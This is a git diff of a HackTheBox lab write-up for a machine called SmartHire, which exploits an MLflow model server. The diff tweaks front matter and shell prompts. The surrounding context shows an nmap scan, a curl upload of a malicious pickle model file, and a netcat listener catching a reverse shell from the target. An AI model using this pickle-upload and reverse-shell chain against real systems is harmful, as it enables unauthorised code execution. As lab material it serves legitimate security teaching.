@@ -1,6 +1,7 @@
 +++
 title = "SmartHire - Executing malicious code through an AI model"
 date = 2026-06-04T14:19:11Z
+difficulty = "medium"
 tags = ["HTB - Medium", "Linux", "Pentesting"]
 description = "Pwning the SmartHire machine from HTB."
 +++
@@ -9,7 +10,7 @@ description = "Pwning the SmartHire machine from HTB."
 ## **RECON**
 After obtaining the target machine's IP address, I ran an nmap scan to identify open TCP ports:
 ```bash
-┌──(root㉿kali)-[/home/esteban/HackTheBox]
+┌──(root㉿pangelinan)-[~/HackTheBox]
 └─# nmap -sS -oN nmap_scan.txt 10.129.245.215                     
 ```
 The scan revealed two open TCP ports for SSH and HTTP (UDP scans did not reveal any open ports):
@@ -96,7 +97,7 @@ python3 bad_pickle.py
 ```
 Then upload the **python_model.pkl** file that had been generated using **curl**:  
 ```bash
-┌──(root㉿kali)-[/home/esteban/HackTheBox]
+┌──(root㉿pangelinan)-[~/HackTheBox]
 └─# curl -X PUT "http://models.smarthire.htb/api/2.0/mlflow-artifacts/artifacts/0/9767cc9db15a45868d72f02f9f6b338c/artifacts/model/python_model.pkl" \
   -H "Content-Type: application/octet-stream" \
   --data-binary @python_model.pkl \
@@ -104,7 +105,7 @@ Then upload the **python_model.pkl** file that had been generated using **curl**
 ```
 The curl command returned an empty response, which meant that the file had been uploaded successfully. Now, all I needed to do was set up a listener on my attacker machine, and go back to my user dashboard on **smarthire.htb** to get the model to run.  
 ```bash
-┌──(root㉿kali)-[/home/esteban/HackTheBox]
+┌──(root㉿pangelinan)-[~/HackTheBox]
 └─# nc -lvnp 4444  
 listening on [any] 4444 ...
 ```
@@ -113,7 +114,7 @@ I went to the **smarthire.htb/predict** endpoint to run the model, this is the p
 I used the .csv file containing the example data shown on the website, nothing special. Clicking the **Analyze Resume** button *did* do something special though...
 ![analyzing](/images/smarthire/analyzing.png)
 ```bash
-┌──(root㉿kali)-[/home/esteban/HackTheBox]
+┌──(root㉿pangelinan)-[~/HackTheBox]
 └─# nc -lvnp 4444
 listening on [any] 4444 ...
 connect to [10.10.16.192] from (UNKNOWN) [10.129.245.215] 42556
